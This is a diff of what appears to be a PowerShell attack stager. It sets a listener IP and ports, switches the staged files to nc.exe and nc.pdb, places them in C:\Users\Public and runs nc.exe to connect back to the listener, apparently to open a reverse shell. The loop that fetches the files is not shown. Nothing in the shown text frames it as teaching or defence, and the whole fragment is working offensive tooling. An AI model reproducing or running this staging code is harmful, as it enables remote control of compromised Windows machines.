@@ -13,7 +13,7 @@ $ip = '192.168.23.129'
 $portNetCat = '8001'
 $portPython3 = '8000'
 
-$files = 'netCat.deps.json', 'netCat.dll', 'netCat.exe', 'netCat.pdb', 'netCat.runtimeconfig.json'
+$files = 'nc.exe', 'nc.pdb'
 
 for ($i = 0; $i -lt $files.Length; ++$i){
 
@@ -29,6 +29,6 @@ Start-Sleep -Seconds 1
 
 Set-Location C:\Users\Public
 
-.\netCat.exe $ip $portNetCat
+.\nc.exe $ip $portNetCat
 
 
